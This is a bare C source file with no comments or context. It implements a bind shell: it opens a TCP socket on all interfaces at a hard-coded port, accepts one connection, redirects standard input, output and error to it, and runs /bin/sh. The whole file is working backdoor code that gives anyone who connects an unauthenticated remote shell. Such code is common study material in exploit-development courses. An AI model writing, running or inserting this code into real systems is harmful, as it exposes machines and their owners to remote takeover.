#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int sock, cli;
struct sockaddr_in serv_addr;

int main()
{
serv_addr.sin_family  = 2;
serv_addr.sin_addr.s_addr = 0;
serv_addr.sin_port = 0x901F;

sock = socket(2, 1, 0);
bind(sock, (struct sockaddr *)&serv_addr, 0x10);
listen(sock, 1);
cli = accept(sock, 0, 0);
dup2(cli, 0);
dup2(cli, 1);
dup2(cli, 2);
execve("/bin/sh", 0, 0);
}
